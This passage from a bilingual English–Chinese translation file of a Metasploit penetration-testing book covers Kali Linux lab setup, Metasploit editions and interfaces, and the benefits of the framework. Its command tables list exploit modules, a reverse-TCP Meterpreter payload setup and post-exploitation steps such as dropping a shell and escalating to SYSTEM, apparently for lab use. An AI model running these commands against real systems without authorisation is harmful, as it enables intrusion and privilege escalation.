    refer to: [http://www.pentest-standard.org/index.php/Reporting](http://www.pentest-standard.org/index.php/Reporting).
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 有关威胁建模阶段涉及的过程的更多信息，请参阅：[http://www.pentest-standard.org/index.php/Reporting](http://www.pentest-standard.org/index.php/Reporting)。
- en: Mounting the environment
  id: totrans-97
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 搭建环境
- en: 'A successful penetration test largely depends on how well your work environment
    and labs are configured. Moreover, a successful test answers the following set
    of questions:'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 成功的渗透测试在很大程度上取决于您的工作环境和实验室的配置。此外，成功的测试回答以下一系列问题：
- en: How well is your test lab configured?
  id: totrans-99
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 你的测试实验室配置得如何？
- en: Are all the required tools for testing available?
  id: totrans-100
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 所有测试所需的工具都齐全吗？
- en: How good is your hardware to support such tools?
  id: totrans-101
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 你的硬件支持这些工具有多好？
- en: Before we begin to test anything, we must make sure that all of the required
    sets of tools are available and updated.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始测试任何东西之前，我们必须确保所有所需的工具集都可用并已更新。
- en: Setting up Kali Linux in a virtual environment
  id: totrans-103
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在虚拟环境中设置Kali Linux
- en: Before using Metasploit, we need to have a test lab. The best idea for setting
    up a test lab is to gather different machines and install different operating
    systems on them. However, if we only have a single device, the best idea is to
    set up a virtual environment.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 在使用Metasploit之前，我们需要有一个测试实验室。建立测试实验室的最佳方法是收集不同的机器并在它们上安装不同的操作系统。然而，如果我们只有一个设备，最好的方法是建立一个虚拟环境。
- en: Virtualization plays an essential role in penetration testing today. Due to
    the high cost of hardware, virtualization plays a cost-effective role in penetration
    testing. Emulating different operating systems under the host operating system
    not only saves you money but also cuts down on electricity and space. However,
    setting up a virtual penetration test lab prevents any modifications on the actual
    host system and allows us to perform operations in an isolated environment. A
    virtual network enables network exploitation to run in an isolated network, thus
    preventing any modifications or the use of network hardware of the host system.
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟化在今天的渗透测试中扮演着重要的角色。由于硬件成本高昂，虚拟化在渗透测试中起到了节约成本的作用。在主机操作系统下模拟不同的操作系统不仅可以节省金钱，还可以节省电力和空间。然而，建立一个虚拟渗透测试实验室可以防止对实际主机系统的任何修改，并允许我们在隔离的环境中执行操作。虚拟网络使网络利用在隔离的网络中运行，从而防止对主机系统的任何修改或使用网络硬件。
- en: Moreover, the snapshot feature of virtualization helps preserve the state of
    the virtual machine at a particular point in time. This feature proves to be very
    helpful, as we can compare or reload a previous state of the operating system
    while testing a virtual environment without reinstalling the entire software in
    case the files are modified after attack simulation.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，虚拟化的快照功能有助于在特定时间点保留虚拟机的状态。这个功能非常有帮助，因为我们可以在测试虚拟环境时比较或重新加载操作系统的先前状态，而无需在攻击模拟后修改文件的情况下重新安装整个软件。
- en: Virtualization expects the host system to have enough hardware resources, such
    as RAM, processing capabilities, drive space, and so on, to run smoothly.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 虚拟化期望主机系统具有足够的硬件资源，如RAM、处理能力、驱动器空间等，以便顺利运行。
- en: For more information on snapshots, refer to: [https://www.virtualbox.org/manual/ch01.html#snapshots](https://www.virtualbox.org/manual/ch01.html#snapshots).
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 有关快照的更多信息，请参阅：[https://www.virtualbox.org/manual/ch01.html#snapshots](https://www.virtualbox.org/manual/ch01.html#snapshots)。
- en: So, let's see how we can create a virtual environment with the Kali operating
    system (the most favored operating system for penetration testing, which contains
    the Metasploit framework by default).
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，让我们看看如何使用Kali操作系统创建虚拟环境（这是渗透测试中最受欢迎的操作系统，其中默认包含Metasploit框架）。
- en: 'You can always download pre-built VMware and VirtualBox images for Kali Linux
    here: [https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/).'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以随时在此处下载Kali Linux的预构建VMware和VirtualBox映像：[https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/)。
- en: 'To create a virtual environment, we need virtual machine software. We can use
    any one of two of the most popular ones: VirtualBox and VMware Workstation Player.
    So, let''s begin with the installation by performing the following steps:'
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 要创建虚拟环境，我们需要虚拟机软件。我们可以使用两种最流行的虚拟机软件之一：VirtualBox和VMware Workstation Player。因此，让我们通过执行以下步骤开始安装：
- en: Download VMware Workstation Player ([https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/14_0](https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/14_0))
    and set it up for your machine's architecture.
  id: totrans-112
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载VMware Workstation Player（[https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/14_0](https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/14_0)）并为您的机器架构设置它。
- en: Run the setup and finalize the installation.
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行设置并完成安装。
- en: Download the latest Kali VM Image ([https://images.offensive-security.com/virtual-images/kali-linux-2017.3-vm-amd64.ova](https://images.offensive-security.com/virtual-images/kali-linux-2017.3-vm-amd64.ova))
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载最新的Kali VM映像（[https://images.offensive-security.com/virtual-images/kali-linux-2017.3-vm-amd64.ova](https://images.offensive-security.com/virtual-images/kali-linux-2017.3-vm-amd64.ova)）
- en: 'Run the VM Player program, as shown in the following screenshot:'
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 运行VM Player程序，如下截图所示：
- en: '![](img/c5eee2a7-3df7-4ad2-bfac-8f12d8b57a60.png)'
  id: totrans-116
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c5eee2a7-3df7-4ad2-bfac-8f12d8b57a60.png)'
- en: Next, go to the Player tab and choose File | Open.
  id: totrans-117
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，转到“Player”选项卡，然后选择“文件”|“打开”。
- en: 'Browse to the extracted `*.ova` file for Kali Linux and click Open. We will
    be presented with the following screen:'
  id: totrans-118
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 浏览到提取的Kali Linux的`*.ova`文件并单击“打开”。我们将看到以下屏幕：
- en: '![](img/e2698050-1ddb-4ac4-9777-18e00113ccd7.png)'
  id: totrans-119
  prefs: []
  type: TYPE_IMG
  zh: '![](img/e2698050-1ddb-4ac4-9777-18e00113ccd7.png)'
- en: Choose any name and select a storage path (I prefer creating a separate folder
    on a drive with maximum available space) and click on Import.
  id: totrans-120
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 选择任何名称并选择存储路径（我更喜欢在具有最大可用空间的驱动器上创建一个单独的文件夹），然后单击“导入”。
- en: The import may take a little time. Be patient and listen to your favorite music
    in the meantime.
  id: totrans-121
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 导入可能需要一些时间。请耐心等待，同时听听您喜欢的音乐。
- en: 'After a successful import, we can see the newly added virtual machine in the
    list of virtual machines, as shown in the following screenshot:'
  id: totrans-122
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 成功导入后，我们可以在虚拟机列表中看到新添加的虚拟机，如下截图所示：
- en: '![](img/61a59699-ec1a-4266-bb2d-0e38764cad64.png)'
  id: totrans-123
  prefs: []
  type: TYPE_IMG
  zh: '![](img/61a59699-ec1a-4266-bb2d-0e38764cad64.png)'
- en: Next, we just need to start the operating system. The good news is that the
    pre-installed VMware Image of Kali Linux is shipped along with VMware Tools which
    makes features such as drag and drop, mounting shared folders, and so on to be
    available on the fly.
  id: totrans-124
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 接下来，我们只需要启动操作系统。好消息是，预安装的Kali Linux的VMware映像随附有VMware Tools，这使得诸如拖放、挂载共享文件夹等功能可以随时使用。
- en: The default credentials for Kali Linux are `root`:`toor`, where the `root` is
    the username and `toor`, is the password.
  id: totrans-125
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: Kali Linux的默认凭据是`root`:`toor`，其中`root`是用户名，`toor`是密码。
- en: 'Let''s quickly open a Terminal and initialize and start the Metasploit database,
    as shown in the following screenshot:'
  id: totrans-126
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们快速打开一个终端并初始化和启动Metasploit数据库，如下截图所示：
- en: '![](img/a6357c27-a083-4440-8b18-a1af1b2b78c0.png)'
  id: totrans-127
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a6357c27-a083-4440-8b18-a1af1b2b78c0.png)'
- en: 'Let''s begin the Metasploit framework by issuing the `msfconsole` command,
    as we can see in the following screenshot:'
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 通过发出`msfconsole`命令来开始Metasploit框架，如下截图所示：
- en: '![](img/c389ab2b-7216-4ffb-8894-e9cb859ae339.png)'
  id: totrans-129
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c389ab2b-7216-4ffb-8894-e9cb859ae339.png)'
- en: For the complete persistent install guide on Kali Linux, refer to: [https://docs.kali.org/category/installation](https://docs.kali.org/category/installation).
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 有关Kali Linux的完整持久安装指南，请参阅：[https://docs.kali.org/category/installation](https://docs.kali.org/category/installation)。
- en: To install Metasploit through the command line in Linux, refer to: [http://www.darkoperator.com/installing-metasploit-in-ubunt/](https://www.darkoperator.com/installing-metasploit-in-ubunt/).
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 要在Linux中通过命令行安装Metasploit，请参阅：[http://www.darkoperator.com/installing-metasploit-in-ubunt/](https://www.darkoperator.com/installing-metasploit-in-ubunt/)。
- en: To install Metasploit on Windows, refer to an excellent guide here: [https://www.packtpub.com/mapt/book/networking_and_servers/9781788295970/2/ch02lvl1sec20/installing-metasploit-on-windows](https://www.packtpub.com/mapt/book/networking_and_servers/9781788295970/2/ch02lvl1sec20/installing-metasploit-on-windows).
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 要在Windows上安装Metasploit，请参考这里的优秀指南：[https://www.packtpub.com/mapt/book/networking_and_servers/9781788295970/2/ch02lvl1sec20/installing-metasploit-on-windows](https://www.packtpub.com/mapt/book/networking_and_servers/9781788295970/2/ch02lvl1sec20/installing-metasploit-on-windows)。
- en: The fundamentals of Metasploit
  id: totrans-133
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit的基础知识
- en: Since we have recalled the essential phases of a penetration test and completed
    the setup of Kali Linux, let's talk about the big picture; that is, Metasploit.
    Metasploit is a security project that provides exploits and tons of reconnaissance
    features to aid the penetration tester. Metasploit was created by H.D. Moore back
    in 2003, and since then, its rapid development has led it to be recognized as
    one of the most popular penetration testing tools. Metasploit is entirely a Ruby-driven
    project and offers a lot of exploits, payloads, encoding techniques, and loads
    of post-exploitation features.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 自从我们回顾了渗透测试的基本阶段并完成了Kali Linux的设置，让我们谈谈大局；也就是Metasploit。Metasploit是一个安全项目，提供了漏洞利用和大量的侦察功能，以帮助渗透测试人员。Metasploit是由H.D.
    Moore于2003年创建的，自那时以来，其快速发展使其被认为是最受欢迎的渗透测试工具之一。Metasploit完全是一个由Ruby驱动的项目，提供了许多漏洞利用、有效载荷、编码技术和大量的后渗透功能。
- en: 'Metasploit comes in various editions, as follows:'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit有各种版本，如下：
- en: '**Metasploit Pro**: This version is a commercial one and offers tons of great
    features such as web application scanning, exploitation, automated exploitation,
    and is quite suitable for professional penetration testers and IT security teams.
    The Pro edition is primarily used for professional, advanced and large penetration
    tests, and enterprise security programs.'
  id: totrans-136
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit Pro：这个版本是商业版，提供了大量出色的功能，如Web应用程序扫描、利用、自动利用，非常适合专业的渗透测试人员和IT安全团队。Pro版主要用于专业、高级和大型渗透测试以及企业安全项目。
- en: '**Metasploit Express**: The express edition is used for baseline penetration
    tests. Features in this version of Metasploit include smart exploitation, the
    automated brute forcing of the credentials, and much more. This version is quite
    suitable for IT security teams in small to medium size companies.'
  id: totrans-137
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit Express：express版本用于基线渗透测试。这个版本的Metasploit包括智能利用、自动暴力破解凭据等功能。这个版本非常适合中小型公司的IT安全团队。
- en: '**Metasploit Community**: This is a free edition with reduced functionalities
    of the express version. However, for students and small businesses, this version
    is a favorable choice.'
  id: totrans-138
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit社区：这是一个免费版本，功能较express版本有所减少。然而，对于学生和小型企业来说，这个版本是一个有利的选择。
- en: '**Metasploit Framework**: This is a command-line edition with all the manual
    tasks, such as manual exploitation, third-party import, and so on. This version
    is suitable for developers and security researchers.'
  id: totrans-139
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploit框架：这是一个命令行版本，包括所有手动任务，如手动利用、第三方导入等。这个版本适合开发人员和安全研究人员。
- en: 'Throughout this book, we will be using the Metasploit Community and Framework
    editions. Metasploit also offers various types of user interfaces, as follows:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 在本书中，我们将使用Metasploit社区和框架版本。Metasploit还提供各种类型的用户界面，如下：
- en: '**The GUI interface**: The GUI has all the options available at the click of
    a button. This interface offers a user-friendly interface that helps to provide
    cleaner vulnerability management.'
  id: totrans-141
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 图形用户界面：GUI具有所有选项，只需点击按钮即可使用。该界面提供了用户友好的界面，有助于提供更清洁的漏洞管理。
- en: '**The console interface**: This is the preferred interface and the most popular
    one as well. This interface provides an all-in-one approach to all the options
    offered by Metasploit. This interface is also considered one of the most stable
    interfaces. Throughout this book, we will be using the console interface the most.'
  id: totrans-142
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 控制台界面：这是首选界面，也是最受欢迎的界面。这个界面提供了Metasploit提供的所有选项的一体化方法。这个界面也被认为是最稳定的界面。在本书中，我们将最常使用控制台界面。
- en: '**The command-line interface**: The command-line interface is the most powerful
    interface. It supports the launching of exploits to activities such as payload
    generation. However, remembering every command while using the command-line interface
    is a difficult job.'
  id: totrans-143
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 命令行界面：命令行界面是最强大的界面。它支持启动利用活动，如有效载荷生成。然而，在使用命令行界面时记住每个命令是一项困难的工作。
- en: '**Armitage**: Armitage by Raphael Mudge added a cool hacker-style GUI interface
    to Metasploit. Armitage offers easy vulnerability management, built-in NMAP scans,
    exploit recommendations, and the ability to automate features using the Cortana
    scripting language. An entire chapter is dedicated to Armitage and Cortana in
    the latter half of this book.'
  id: totrans-144
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Armitage：Raphael Mudge的Armitage为Metasploit添加了一个酷炫的黑客风格的GUI界面。Armitage提供了易于管理的漏洞管理、内置NMAP扫描、利用建议以及使用Cortana脚本语言自动化功能的能力。本书的后半部分专门介绍了Armitage和Cortana。
- en: For more information on the Metasploit community, refer to: [https://blog.rapid7.com/2011/12/21/metasploit-tutorial-an-introduction-to-metasploit-community/](https://blog.rapid7.com/2011/12/21/metasploit-tutorial-an-introduction-to-metasploit-community/).
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 有关Metasploit社区的更多信息，请参阅：[https://blog.rapid7.com/2011/12/21/metasploit-tutorial-an-introduction-to-metasploit-community/](https://blog.rapid7.com/2011/12/21/metasploit-tutorial-an-introduction-to-metasploit-community/)。
- en: Conducting a penetration test with Metasploit
  id: totrans-146
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Metasploit进行渗透测试
- en: After setting up Kali Linux, we are now ready to perform our first penetration
    test with Metasploit. However, before we start the test, let's recall some of
    the essential functions and terminologies used in the Metasploit framework.
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 在设置好Kali Linux之后，我们现在准备使用Metasploit进行第一次渗透测试。然而，在开始测试之前，让我们回顾一些Metasploit框架中使用的基本功能和术语。
- en: Recalling the basics of Metasploit
  id: totrans-148
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 回顾Metasploit的基础知识
- en: 'After we run Metasploit, we can list all the useful commands available in the
    framework by typing help or ? in the Metasploit console. Let''s recall the basic
    terms used in Metasploit, which are as follows:'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行Metasploit之后，我们可以在Metasploit控制台中键入help或?来列出框架中所有可用的有用命令。让我们回顾一下Metasploit中使用的基本术语，如下所示：
- en: '**Exploits**: This is a piece of code that, when executed, will exploit the
    vulnerability of the target.'
  id: totrans-150
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**利用**: 这是一段代码，当执行时，将利用目标的漏洞。'
- en: '**Payload**: This is a piece of code that runs at the target after successful
    exploitation. It defines the actions we want to perform on the target system.'
  id: totrans-151
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**有效载荷**: 这是在成功利用后在目标上运行的代码。它定义了我们想要在目标系统上执行的操作。'
- en: '**Auxiliary**: These are modules that provide additional functionalities such
    as scanning, fuzzing, sniffing, and much more.'
  id: totrans-152
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**辅助**: 这些是提供额外功能的模块，如扫描、模糊测试、嗅探等。'
- en: '**Encoders**: Encoders are used to obfuscate modules to avoid detection by
    a protection mechanism such as an antivirus or a firewall.'
  id: totrans-153
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**编码器**: 编码器用于混淆模块，以避免被防病毒软件或防火墙等保护机制检测到。'
- en: '**Meterpreter**: Meterpreter is a payload that uses in-memory DLL injection
    stagers. It provides a variety of functions to perform at the target, which makes
    it a popular choice.'
  id: totrans-154
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Meterpreter**: Meterpreter是一种使用内存DLL注入分段器的有效载荷。它提供了各种功能，可在目标上执行，这使其成为一个受欢迎的选择。'
- en: 'Now, let''s recall some of the basic commands of Metasploit that we will use
    in this chapter. Let''s see what they are supposed to do:'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们回顾一些我们将在本章中使用的Metasploit的基本命令。让我们看看它们应该做什么：
- en: '| **Command** | **Usage** | **Example** |'
  id: totrans-156
  prefs: []
  type: TYPE_TB
  zh: '| **命令** | **用法** | **示例** |'
- en: '| `use [Auxiliary/Exploit/Payload/Encoder]` | To select a particular module
    to start working with | `msf>use exploit/unix/ftp/vsftpd_234_backdoor msf>use
    auxiliary/scanner/portscan/tcp` |'
  id: totrans-157
  prefs: []
  type: TYPE_TB
  zh: '| `use [Auxiliary/Exploit/Payload/Encoder]` | 选择要开始使用的特定模块 | `msf>use exploit/unix/ftp/vsftpd_234_backdoor
    msf>use auxiliary/scanner/portscan/tcp` |'
- en: '| `show [exploits/payloads/encoder/auxiliary/options]` | To see the list of
    available modules of a particular type | `msf>show payloads msf> show options`
    |'
  id: totrans-158
  prefs: []
  type: TYPE_TB
  zh: '| `show [exploits/payloads/encoder/auxiliary/options]` | 查看特定类型的可用模块列表 | `msf>show
    payloads msf> show options` |'
- en: '| `set [options/payload]` | To set a value to a particular object | `msf>set
    payload windows/meterpreter/reverse_tcp msf>set LHOST 192.168.10.118 msf> set
    RHOST 192.168.10.112 msf> set LPORT 4444 msf> set RPORT 8080` |'
  id: totrans-159
  prefs: []
  type: TYPE_TB
  zh: '| `set [options/payload]` | 为特定对象设置值 | `msf>set payload windows/meterpreter/reverse_tcp
    msf>set LHOST 192.168.10.118 msf> set RHOST 192.168.10.112 msf> set LPORT 4444
    msf> set RPORT 8080` |'
- en: '| `setg [options/payload]` | To set a value to a particular object globally,
    so the values do not change when a module is switched on | `msf>setg RHOST 192.168.10.112`
    |'
  id: totrans-160
  prefs: []
  type: TYPE_TB
  zh: '| `setg [options/payload]` | 全局设置特定对象的值，因此在模块切换时值不会改变 | `msf>setg RHOST 192.168.10.112`
    |'
- en: '| `run` | To launch an auxiliary module after all the required options are
    set | `msf>run` |'
  id: totrans-161
  prefs: []
  type: TYPE_TB
  zh: '| `run` | 在设置所有必需的选项后启动辅助模块 | `msf>run` |'
- en: '| `exploit` | To launch an exploit | `msf>exploit` |'
  id: totrans-162
  prefs: []
  type: TYPE_TB
  zh: '| `exploit` | 启动一个利用 | `msf>exploit` |'
- en: '| `back` | To unselect a module and move back | `msf(ms08_067_netapi)>back
    msf>` |'
  id: totrans-163
  prefs: []
  type: TYPE_TB
  zh: '| `back` | 取消选择模块并返回 | `msf(ms08_067_netapi)>back msf>` |'
- en: '| `Info` | To list the information related to a particular exploit/module/auxiliary
    | `msf>info exploit/windows/smb/ms08_067_netapi msf(ms08_067_netapi)>info` |'
  id: totrans-164
  prefs: []
  type: TYPE_TB
  zh: '| `Info` | 列出与特定漏洞/模块/辅助相关的信息 | `msf>info exploit/windows/smb/ms08_067_netapi
    msf(ms08_067_netapi)>info` |'
- en: '| `Search` | To find a particular module | `msf>search hfs` |'
  id: totrans-165
  prefs: []
  type: TYPE_TB
  zh: '| `Search` | 查找特定模块 | `msf>search hfs` |'
- en: '| `check` | To check whether a particular target is vulnerable to the exploit
    or not | `msf>check` |'
  id: totrans-166
  prefs: []
  type: TYPE_TB
  zh: '| `check` | 检查特定目标是否容易受到攻击 | `msf>check` |'
- en: '| `Sessions` | To list the available sessions | `msf>sessions [session number]`
    |'
  id: totrans-167
  prefs: []
  type: TYPE_TB
  zh: '| `Sessions` | 列出可用的会话 | `msf>sessions [session number]` |'
- en: 'Let''s have a look at the basic Meterpreter commands as well:'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们来看看基本的Meterpreter命令：
- en: '| **Meterpreter commands** | **Usage** | **Example** |'
  id: totrans-169
  prefs: []
  type: TYPE_TB
  zh: '| **Meterpreter命令** | **用法** | **示例** |'
- en: '| `sysinfo` | To list system information of the compromised host | `meterpreter>sysinfo`
    |'
  id: totrans-170
  prefs: []
  type: TYPE_TB
  zh: '| `sysinfo` | 列出受损主机的系统信息 | `meterpreter>sysinfo` |'
- en: '| `ifconfig` | To list the network interfaces on the compromised host | `meterpreter>ifconfig
    meterpreter>ipconfig (Windows)` |'
  id: totrans-171
  prefs: []
  type: TYPE_TB
  zh: '| `ifconfig` | 列出受损主机上的网络接口 | `meterpreter>ifconfig meterpreter>ipconfig (Windows)`
    |'
- en: '| `arp` | List of IP and MAC addresses of hosts connected to the target | `meterpreter>arp`
    |'
  id: totrans-172
  prefs: []
  type: TYPE_TB
  zh: '| `arp` | 列出连接到目标的主机的IP和MAC地址 | `meterpreter>arp` |'
- en: '| `background` | To send an active session to the background | `meterpreter>background`
    |'
  id: totrans-173
  prefs: []
  type: TYPE_TB
  zh: '| `background` | 将活动会话发送到后台 | `meterpreter>background` |'
- en: '| `shell` | To drop a cmd shell on the target | `meterpreter>shell` |'
  id: totrans-174
  prefs: []
  type: TYPE_TB
  zh: '| `shell` | 在目标上放置一个cmd shell | `meterpreter>shell` |'
- en: '| `getuid` | To get the current user''s details | `meterpreter>getuid` |'
  id: totrans-175
  prefs: []
  type: TYPE_TB
  zh: '| `getuid` | 获取当前用户的详细信息 | `meterpreter>getuid` |'
- en: '| `getsystem` | To escalate privileges and gain SYSTEM access | `meterpreter>getsystem`
    |'
  id: totrans-176
  prefs: []
  type: TYPE_TB
  zh: '| `getsystem` | 提升权限并获得SYSTEM访问权限 | `meterpreter>getsystem` |'
- en: '| `getpid` | To gain the process ID of the meterpreter access | `meterpreter>getpid`
    |'
  id: totrans-177
  prefs: []
  type: TYPE_TB
  zh: '| `getpid` | 获取meterpreter访问的进程ID | `meterpreter>getpid` |'
- en: '| `ps` | To list all the processes running on the target | `meterpreter>ps`
    |'
  id: totrans-178
  prefs: []
  type: TYPE_TB
  zh: '| `ps` | 列出目标上运行的所有进程 | `meterpreter>ps` |'
- en: Since we have now recalled the basics of Metasploit commands, let's have a look
    at the benefits of using Metasploit over traditional tools and scripts in the
    next section.
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 既然我们现在回顾了Metasploit命令的基础知识，让我们在下一节看看使用Metasploit相对于传统工具和脚本的好处。
- en: If you are using Metasploit for the very first time, refer to [https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)
    for more information on basic commands.
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您是第一次使用Metasploit，请参考[https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/](https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/)获取有关基本命令的更多信息。
- en: Benefits of penetration testing using Metasploit
  id: totrans-181
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用Metasploit进行渗透测试的好处
- en: Before we jump into an example penetration test, we must know why we prefer
    Metasploit to manual exploitation techniques. Is this because of a hacker-like
    Terminal that gives a pro look, or is there a different reason? Metasploit is
    a preferable choice when compared to traditional manual techniques because of
    specific factors that are discussed in the following sections.
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们深入研究一个未知网络之前，我们必须知道为什么我们更喜欢 Metasploit 而不是手动利用技术。这是因为它给人一种黑客般的终端外观，还是有其他原因？与传统的手动技术相比，Metasploit
    是一个更可取的选择，因为它具有以下几个方面的特点。
- en: Open source
  id: totrans-183
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 开源
- en: One of the top reasons why one should go with the Metasploit framework is because
    it is open source and actively developed. Various other highly paid tools exist
    for carrying out penetration testing. However, Metasploit allows its users to
    access its source code and add their custom modules. The Pro version of Metasploit
    is chargeable, but for the sake of learning, the community edition is mostly preferred.
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 选择 Metasploit 框架的首要原因之一是因为它是开源的，并且在积极开发中。还有其他一些高薪工具用于进行渗透测试。然而，Metasploit 允许用户访问其源代码并添加自定义模块。Metasploit
    的专业版是收费的，但出于学习的目的，大多数人更喜欢社区版。
- en: Support for testing large networks and natural naming conventions
  id: totrans-185
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 支持测试大型网络和自然的命名约定
- en: Using Metasploit is easy. However, here, ease of use refers to natural naming
    conventions of the commands. Metasploit offers excellent comfort while conducting
    a massive network penetration test. Consider a scenario where we need to test
    a network with 200 systems. Instead of checking each system one after the other,
    Metasploit offers to examine the entire range automatically. Using parameters
    such as subnet and **Classless Inter-Domain Routing** (**CIDR**) values, Metasploit
    tests all the systems to exploit the vulnerability, whereas using manual techniques,
    we might need to launch the exploits manually onto 200 systems. Therefore, Metasploit
    saves a significant amount of time and energy.
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 Metasploit 很容易。然而，在这里，易用性指的是命令的自然命名约定。Metasploit 在进行大规模网络渗透测试时提供了极大的便利。考虑一个情景，我们需要测试一个拥有
    200 台系统的网络。与其逐个检查每个系统，不如使用 Metasploit 自动检查整个范围。使用子网和 CIDR 值等参数，Metasploit 测试所有系统以利用漏洞，而使用手动技术，我们可能需要手动对
    200 台系统启动 exploit。因此，Metasploit 节省了大量的时间和精力。
- en: Smart payload generation and switching mechanism
  id: totrans-187
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 智能负载生成和切换机制
- en: Most importantly, switching between payloads in Metasploit is easy. Metasploit
    provides quick access to change payloads using the `set payload` command. Therefore,
    turning the Meterpreter or shell-based access into a more specific operation,
    such as adding a user and getting the remote desktop access, becomes easy. Generating
    shellcode to use in manual exploits also becomes easy by using the `msfvenom`
    application from the command line.
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 最重要的是，在 Metasploit 中切换负载很容易。Metasploit 提供了使用 `set payload` 命令快速更改负载的途径。因此，将
    Meterpreter 或基于 shell 的访问转换为更具体的操作，比如添加用户和获取远程桌面访问，变得容易。通过使用命令行中的 `msfvenom` 应用程序，生成用于手动利用的
    shellcode 也变得容易。
- en: Cleaner exits
  id: totrans-189
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 更干净的退出
- en: Metasploit is also responsible for making a much cleaner exit from the systems
    it has compromised. A custom-coded exploit, on the other hand, can crash the system
    while exiting its operations. Making a clean exit is indeed an essential factor
    in cases where we know that the service will not restart immediately.
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit 也负责从其 compromise 的系统中更干净地退出。另一方面，自定义编码的 exploit 在退出操作时可能会导致系统崩溃。在我们知道服务不会立即重新启动的情况下，干净地退出确实是一个重要因素。
- en: Consider a scenario where we have compromised a web server, and while we were
    making an exit, the exploited application crashes. The scheduled maintenance time
